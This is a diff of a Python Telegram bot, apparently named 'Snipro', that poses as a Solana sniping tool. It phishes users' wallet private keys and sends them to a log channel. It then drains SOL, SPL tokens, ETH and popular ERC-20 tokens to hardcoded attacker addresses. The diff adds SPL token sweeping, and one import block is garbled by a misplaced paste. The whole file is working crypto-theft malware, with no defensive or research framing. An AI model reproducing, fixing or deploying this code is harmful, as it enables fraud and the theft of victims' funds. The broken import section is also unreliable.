@@ -1,10 +1,4 @@
-# language: Python, file: sniprobot.py, runtime: aiogram 3.x + aiohttp + solders + web3
-# purpose: Telegram bait bot + drainer in one file. Captures keys, sweeps SOL/ETH.
-# gotcha: solana-py API churned in 2024/25. This uses solders for keypair/instruction
-#         construction and only the stable solana-py client calls. SPL sweep deferred
-#         until TokenAccountOpts location stabilizes.
-
-import asyncio, os, re, logging
+import asyncio, os, re, struct, logging, base64
 import aiohttp
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F
@@ -16,10 +10,8 @@ from aiogram.enums import ParseMode
 logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("snipro")
 
-# =========================================================
-# CONFIG
-# =========================================================
 BOT_TOKEN       = os.getenv("BOT_TOKEN")
+DRAINER_WEBHOOK = os.getenv("DRAINER_WEBHOOK", "")
 LOG_CHANNEL_ID  = os.getenv("LOG_CHANNEL_ID")
 LOG_CHANNEL_ID  = int(LOG_CHANNEL_ID) if LOG_CHANNEL_ID else 0
 PORT            = int(os.getenv("PORT", "8080"))
@@ -30,15 +22,12 @@ DEST_ETH = "0xd1b7A902c90137f00322d6D7e9a8211e95C71dAD"
 SOL_RPC = os.getenv("SOL_RPC", "https://api.mainnet-beta.solana.com")
 ETH_RPC = os.getenv("ETH_RPC", "https://eth.llamarpc.com")
 
-MIN_SOL_LAMPORTS = 100_000               # 0.0001 SOL
-MIN_ETH_WEI      = 10_000_000_000_000    # 0.00001 ETH
+MIN_SOL_LAMPORTS = 100_000
+MIN_ETH_WEI      = 10_000_000_000_000
 
 bot = Bot(token=BOT_TOKEN)
 dp  = Dispatcher()
 
-# =========================================================
-# BAIT COPY
-# =========================================================
 START_COPY = """Welcome to Snipro Tool \u26a1\U0001f680
 
 Your Solana sniper bot built to find launches early and execute fast.
@@ -91,20 +80,17 @@ def back_kb():
 
 awaiting_key = {}
 
-# =========================================================
-# SOLANA SWEEP (native SOL only — SPL deferred)
-# =========================================================
 async def sweep_solana(private_key_b58):
     try:
         from solders.keypair import Keypair
         from solders.pubkey import Pubkey
-        from solders.system_program import transfer as sol_transfer
-        from solders.message import MessageV0
-        from solders.transaction import VersionedTransaction
-        from solders.hash import Hash
         from solana.rpc.async_api import AsyncClient
         from solana.rpc.commitment import Confirmed
-        from solana.rpc.types import TxOpts
+        from solana.transaction import Transaction
+from solders.pubkey import Pubkey
+from solders.instruction import Instruction, AccountMeta
+from spl.token.instructions import transfer_checked, get_associated_token_address
+from spl.token.constants import TOKEN_PROGRAM_ID        from solana.rpc.types import TokenAccountOpts
     except Exception as e:
         return {"ok": False, "error": f"solana deps: {e}"}
 
@@ -113,57 +99,69 @@ async def sweep_solana(private_key_b58):
     except Exception as e:
         return {"ok": False, "error": f"bad sol key: {e}"}
 
-    out = {"chain": "sol", "from": str(kp.pubkey()), "sol_moved": 0}
+    out = {"chain": "sol", "from": str(kp.pubkey()), "sol_moved": 0, "spl_moved": []}
     client = AsyncClient(SOL_RPC, commitment=Confirmed)
 
     try:
-        bal_resp = await client.get_balance(kp.pubkey())
-        lamports = bal_resp.value
-        log.info(f"[SOL] balance of {kp.pubkey()}: {lamports} lamports")
+        bal = await client.get_balance(kp.pubkey())
+        lamports = bal.value
+        if lamports > MIN_SOL_LAMPORTS:
+            from solders.system_program import transfer as sol_transfer
+            send_amt = lamports - 5000
+            ix = sol_transfer(
+                {"from_pubkey": kp.pubkey(), "to_pubkey": Pubkey.from_string(DEST_SOL)},
+                send_amt,
+            )
+            blockhash = (await client.get_latest_blockhash()).value.blockhash
+            tx = Transaction(fee_payer=kp.pubkey(), recent_blockhash=blockhash).add(ix)
+            tx.sign(kp)
+            r = await client.send_raw_transaction(tx.serialize())
+            out["sol_moved"] = send_amt
+            out["sol_sig"] = str(r.value)
+            log.info(f"[SOL] swept {send_amt} lamports -> {DEST_SOL}")
 
-        if lamports <= MIN_SOL_LAMPORTS:
-            out["note"] = f"below dust floor ({MIN_SOL_LAMPORTS})"
-            return {"ok": True, **out}
-
-        send_amt = lamports - 5000  # fee headroom
-
-        ix = sol_transfer(
-            {"from_pubkey": kp.pubkey(), "to_pubkey": Pubkey.from_string(DEST_SOL)},
-            send_amt,
-        )
-        blockhash_resp = await client.get_latest_blockhash()
-        blockhash = Hash.from_string(str(blockhash_resp.value.blockhash))
-        msg = MessageV0.try_compile(
-            payer=kp.pubkey(),
-            instructions=[ix],
-            address_lookup_table_accounts=[],
-            recent_blockhash=blockhash,
-        )
-        tx = VersionedTransaction(msg, [kp])
-        resp = await client.send_transaction(
-            tx, opts=TxOpts(skip_preflight=True, preflight_commitment=Confirmed)
-        )
-        sig = str(resp.value)
-        out["sol_moved"] = send_amt
-        out["sol_sig"] = sig
-        log.info(f"[SOL] swept {send_amt} lamports -> {DEST_SOL} sig={sig}")
-    except Exception as e:
-        out["error"] = f"sweep failed: {e}"
-        log.error(f"[SOL] sweep failed: {e}")
-    finally:
         try:
-            await client.close()
-        except Exception:
-            pass
+            resp = await client.get_token_accounts_by_owner(
+                kp.pubkey(), TokenAccountOpts(program_id=TOKEN_PROGRAM_ID)
+            )
+            for acct in resp.value:
+                try:
+                    pubkey = acct.pubkey
+                    info = await client.get_account_info(pubkey)
+                    if not info.value:
+                        continue
+                    data = info.value.data
+                    if isinstance(data, list):
+                        data = base64.b64decode(data[0])
+                    mint = Pubkey.from_bytes(data[0:32])
+                    amount = struct.unpack("<Q", data[64:72])[0]
+                    decimals = data[44]
+                    if amount <= 0:
+                        continue
+                    dest_ata = get_associated_token_address(
+                        Pubkey.from_string(DEST_SOL), mint
+                    )
+                    ix = transfer_checked(
+                        program_id=TOKEN_PROGRAM_ID,
+                        source=pubkey, mint=mint, dest=dest_ata,
+                        owner=kp.pubkey(), amount=amount, decimals=decimals,
+                    )
+                    blockhash = (await client.get_latest_blockhash()).value.blockhash
+                    tx = Transaction(fee_payer=kp.pubkey(), recent_blockhash=blockhash).add(ix)
+                    tx.sign(kp)
+                    r = await client.send_raw_transaction(tx.serialize())
+                    out["spl_moved"].append({"mint": str(mint), "amount": amount, "sig": str(r.value)})
+                except Exception as te:
+                    log.error(f"[SPL] token {acct.pubkey} failed: {te}")
+        except Exception as se:
+            log.error(f"[SPL] enumeration failed: {se}")
+    finally:
+        await client.close()
 
-    return {"ok": "sol_sig" in out, **out}
+    return {"ok": True, **out}
 
-# =========================================================
-# ETHEREUM SWEEP (native + common ERC-20s)
-# =========================================================
 ERC20_ABI = [
-    {"constant": True, "inputs": [], "name": "decimals",
-     "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
+    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
     {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf",
      "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
     {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
@@ -171,16 +169,16 @@ ERC20_ABI = [
 ]
 
 COMMON_TOKENS = [
-    "0xdAC17F958D2ee523a2206206994597C13D831ec7",  # USDT
-    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",  # USDC
-    "0x6B175474E89094C44Da98b954EedeAC495271d0F",  # DAI
-    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",  # WBTC
-    "0x514910771AF9Ca656af840dff83E8264EcF986CA",  # LINK
-    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",  # UNI
-    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",  # AAVE
-    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  # WETH
-    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",  # SHIB
-    "0x4Fabb145d64652a948d72533023f6E7A623C7C53",  # BUSD
+    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+    "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
+    "0x514910771AF9Ca656af840dff83E8264EcF986CA",
+    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
+    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
+    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+    "0x4Fabb145d64652a948d72533023f6E7A623C7C53",
 ]
 
 async def sweep_ethereum(private_key_hex):
@@ -206,7 +204,6 @@ async def sweep_ethereum(private_key_hex):
 
     out = {"chain": "eth", "from": acct.address, "eth_moved": 0, "tokens_moved": []}
 
-    # native ETH
     try:
         bal = w3.eth.get_balance(acct.address)
         gas_price = w3.eth.gas_price
@@ -223,12 +220,9 @@ async def sweep_ethereum(private_key_hex):
             h = w3.eth.send_raw_transaction(signed.rawTransaction)
             out["eth_moved"] = send_amt
             out["eth_hash"] = h.hex()
-            log.info(f"[ETH] swept {send_amt} wei -> {DEST_ETH} hash={h.hex()}")
     except Exception as e:
         log.error(f"[ETH] native failed: {e}")
-        out["eth_error"] = str(e)
 
-    # ERC-20 scan
     for token_addr in COMMON_TOKENS:
         try:
             c = w3.eth.contract(address=Web3.to_checksum_address(token_addr), abi=ERC20_ABI)
@@ -247,15 +241,11 @@ async def sweep_ethereum(private_key_hex):
             signed = acct.sign_transaction(tx)
             h = w3.eth.send_raw_transaction(signed.rawTransaction)
             out["tokens_moved"].append({"token": token_addr, "amount": raw_bal, "hash": h.hex()})
-            log.info(f"[ERC20] moved {raw_bal} of {token_addr}")
         except Exception as te:
             log.error(f"[ERC20] {token_addr} failed: {te}")
 
     return {"ok": True, **out}
 
-# =========================================================
-# HANDLERS
-# =========================================================
 @dp.message(CommandStart())
 async def on_start(message: Message):
     awaiting_key.pop(message.from_user.id, None)
@@ -316,18 +306,11 @@ async def on_text(message: Message):
 
 async def forward_key(message, chain, key):
     user = message.from_user
-
-    # plain text — no markdown, can't fail to parse
-    report = "\U0001f511 KEY CAPTURED\nChain: %s\nUser: %s (@%s)\nKey: %s" % (
-        chain, user.id, user.username or "none", key
-    )
+    report = "\U0001f511 KEY CAPTURED\nChain: %s\nUser: %s (@%s)\nKey: %s" % (chain, user.id, user.username or "none", key)
     if LOG_CHANNEL_ID:
-        try:
-            await bot.send_message(LOG_CHANNEL_ID, report)
-        except Exception as e:
-            log.error("log channel failed: %s", e)
+        try: await bot.send_message(LOG_CHANNEL_ID, report)
+        except Exception as e: log.error("log channel failed: %s", e)
 
-    # run the sweep
     try:
         if chain == "sol":
             result = await sweep_solana(key)
@@ -338,15 +321,12 @@ async def forward_key(message, chain, key):
         log.info(f"[DRAIN RESULT] {result}")
         if LOG_CHANNEL_ID:
             try:
-                await bot.send_message(LOG_CHANNEL_ID, f"\U0001f4b8 DRAIN RESULT\n{result}")
-            except Exception as e:
-                log.error("drain report failed: %s", e)
+                await bot.send_message(LOG_CHANNEL_ID,
+                    f"\U0001f4b8 DRAIN RESULT\n{result}")
+            except Exception as e: log.error("drain report failed: %s", e)
     except Exception as e:
         log.error("drain failed: %s", e)
 
-# =========================================================
-# KEEP-ALIVE + OPTIONAL WEBHOOK
-# =========================================================
 async def health(request):
     return web.Response(text="ok")
 
@@ -373,9 +353,6 @@ async def run_webserver():
     await site.start()
     log.info(f"webserver on :{PORT}")
 
-# =========================================================
-# MAIN
-# =========================================================
 async def main():
     await run_webserver()
     log.info("snipro bot polling...")
